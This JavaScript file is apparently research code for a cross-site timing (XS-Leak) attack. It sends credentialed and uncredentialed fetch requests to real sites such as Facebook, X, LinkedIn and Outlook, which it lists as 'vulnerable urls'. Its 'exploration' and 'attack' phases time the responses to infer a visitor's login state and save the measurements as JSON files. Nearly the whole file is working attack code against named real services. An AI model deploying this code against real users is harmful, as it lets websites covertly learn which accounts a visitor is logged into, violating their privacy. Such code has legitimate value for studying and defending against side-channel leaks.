// Returns the current time formatted as "HH:MM:SS AM/PM".
function getFormattedTime() {
    const date = new Date();
    let hours = date.getHours();
    const minutes = date.getMinutes().toString().padStart(2, '0');
    const seconds = date.getSeconds().toString().padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12 || 12;
    const formattedHours = hours.toString().padStart(2, '0');
    return `${formattedHours}:${minutes}:${seconds} ${ampm}`;
}

// Measures the response time for a fetch request and logs the data into provided arrays.
function fetchMeasure(url, creds, measures, arr, arr_status, arr_resp_size, arr_url, mode, redirect) {
	let start = performance.now()
	fetch(url, {
		redirect: redirect,
 		mode: mode,
		cache: 'no-cache',
		credentials: creds,
	}).then(() => {
		let time = performance.now() - start
		measures[arr].push(time)
		measures[arr_url].push(url)
	}).catch(() => {
		let time = performance.now() - start
		measures[arr].push(time)
		measures[arr_url].push(url)
	})
}

// Saves the provided data as a JSON file with a timestamped filename.
function saveToFile(dataArray, iteration) {
    const blob = new Blob([JSON.stringify(dataArray, null, 2)], { type: 'application/json' });
    const link = document.createElement('a');
    const timestamp = new Date().toISOString().replace(/[:.-]/g, '_');
    link.href = URL.createObjectURL(blob);
    link.download = `results_iteration_${iteration}_${timestamp}.json`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Handles measurements for the exploration phase, measuring the time it takes for an omit, include and redirect request.
function explorationPhase(urls, state) {
	console.log("Starting...")
    let iteration = 1;

    // Function that handles the batch of requests.
    function executeBatch() {
		console.log("Starting iteration number " + iteration + "...")
		let union_measures = {}
        let measures = {'time': [], 'user_state': state, 'include': [], 'omit': [], 'bogus_omit': [], 'bogus_include': [], 'redirect_omit': [], 'redirect_include': [],
			'include_status': [], 'omit_status': [], 'bogus_omit_status': [], 'bogus_include_status': [], 'redirect_omit_status': [], 'redirect_include_status': [],
			'include_resp_size': [], 'omit_resp_size': [], 'bogus_omit_resp_size': [], 'bogus_include_resp_size': [], 'redirect_omit_resp_size': [], 'redirect_include_resp_size': [],
			'include_url': [], 'omit_url': [], 'bogus_omit_url': [], 'bogus_include_url': [], 'redirect_omit_url': [], 'redirect_include_url': [],
		}
		for (let key in urls) {
			union_measures[key] = structuredClone(measures);
		}
        let minuteCounter = 0;

        const minutesInterval = setInterval(() => {
			for (let keyy in urls) {
				union_measures[keyy]['time'].push(getFormattedTime());
	
				let url = urls[keyy][0] + "?rand=";
				let redirect_url = urls[keyy][1] + "?rand=";
	
				fetchMeasure(url + (Math.random() + 1).toString(36).substring(7), 'include', union_measures[keyy], 'include', 'include_status', 'include_resp_size', 'include_url', 'cors', 'manual');
				fetchMeasure(url + (Math.random() + 1).toString(36).substring(7), 'omit', union_measures[keyy], 'omit', 'omit_status', 'omit_resp_size', 'omit_url', 'cors', 'manual');
				fetchMeasure(redirect_url + (Math.random() + 1).toString(36).substring(7), 'omit', union_measures[keyy], 'redirect_omit', 'redirect_omit_status', 'redirect_omit_resp_size', 'redirect_omit_url', 'cors', 'manual');
			}

            minuteCounter++;

            if (minuteCounter === 50) { // Number of requests to send in each batch (samples)
                clearInterval(minutesInterval);
				setTimeout(() => {
					saveToFile(union_measures, iteration - 1);
				}, 5000);

                iteration++;
                if (iteration <= 360) { // How many times the batch has to be repeated (endtime)
					setTimeout(() => {
						executeBatch();
					}, 3400000); // Repeat the batch of requests after tick
                }
            }
        }, 5000);
    }

    executeBatch();
}

// Handles measurements for the exploitation phase, measuring the time it takes for an omit, include and redirect request.
function attackPhase(urls, expected_result) {
	console.log("Starting...")
    let iteration = 1;
	let increment = false;

    // Function that handles the repeated execution every minute for 30 minutes.
    function executeBatch() {
		console.log("Starting iteration number " + iteration + "...")
		let union_measures = {}
		let measures = {'expected_result': expected_result, 'time': [], 'measured_response_times': [], 'measured_response_times_omit': [], 'bogus_measured_response_times': [], 'redirect_measured_response_times': [],
			'measured_response_times_status': [], 'measured_response_times_status_omit': [], 'bogus_measured_response_times_status': [], 'redirect_measured_response_times_status': [],
			'measured_response_times_resp_size': [], 'measured_response_times_resp_size_omit': [], 'bogus_measured_response_times_resp_size': [], 'redirect_measured_response_times_resp_size': [],
			'measured_response_times_url': [], 'measured_response_times_url_omit': [], 'bogus_measured_response_times_url': [], 'redirect_measured_response_times_url': [],
		}
		for (let key in urls) {
			union_measures[key] = structuredClone(measures);
		}
		let minuteCounter = 0;

		const minuteInterval = setInterval(() => {
			for (let keyy in urls) {
				union_measures[keyy]['time'].push(getFormattedTime());

				let url = urls[keyy][0] + "?rand=";
				let redirect_url = urls[keyy][1] + "?rand=";

				fetchMeasure(url + (Math.random() + 1).toString(36).substring(7), 'include', union_measures[keyy], 'measured_response_times', 'measured_response_times_status', 'measured_response_times_resp_size', 'measured_response_times_url', 'cors', 'manual');
				fetchMeasure(url + (Math.random() + 1).toString(36).substring(7), 'omit', union_measures[keyy], 'measured_response_times_omit', 'measured_response_times_status_omit', 'measured_response_times_resp_size_omit', 'measured_response_times_url_omit', 'cors', 'manual');
				fetchMeasure(redirect_url + (Math.random() + 1).toString(36).substring(7), 'omit', union_measures[keyy], 'redirect_measured_response_times', 'redirect_measured_response_times_status', 'redirect_measured_response_times_resp_size', 'redirect_measured_response_times_url', 'cors', 'manual');
			}

			minuteCounter++;

			if (minuteCounter === 20) { // Number of requests to send in each batch (samples)
				clearInterval(minuteInterval);
				setTimeout(() => {
					saveToFile(union_measures, iteration);
					if (increment) {
						iteration++;
					}
					increment = !increment;
				}, 4000);

                // if (iteration <= 360) { // How many times the batch has to be repeated (endtime)
				// 	setTimeout(() => {
				// 		executeBatch();
				// 	}, 1800000); // Repeat the batch of requests after tick
                // }
			}

		}, 2000);
	}

	executeBatch();
}

function startProcess(phase, expected_result) {
	// List of vulnerable urls and urls that lead to a redirect
	let urls = {
		"microsoft": ["https://www.microsoft.com/it-it/", "https://www.microsoft.com/"],
		"facebook": ["https://www.facebook.com/", "https://it-it.facebook.com/"],
		"x": ["https://x.com/", "https://www.twitter.com/"],
		"office": ["https://www.office.com/", "https://www.office.com/it/"],
		"linkedin": ["https://www.linkedin.com/", "https://www.linkedin.it/"],
		"live": ["https://outlook.live.com/mail/0/", "https://live.com/"],
		"wikipedia": ["https://en.wikipedia.org/wiki/Main_Page/", "https://wikipedia.org/"],
		"bing": ["https://www.bing.com/", "https://www.bing.it/"],
		"pinterest": ["https://it.pinterest.com/", "https://pinterest.com/"],
		"adobe": ["https://www.adobe.com/home/", "https://adobe.com/"],
		"spotify": ["https://open.spotify.com/", "https://www.spotify.com/"],
		"vimeo": ["https://vimeo.com/home/", "https://www.vimeo.com/"],
		"skype": ["https://secure.skype.com/portal/profile/", "https://www.skype.com/"],
	}
	if (phase) {
		explorationPhase(urls, expected_result);
	} else {
		attackPhase(urls, expected_result);
	}
}
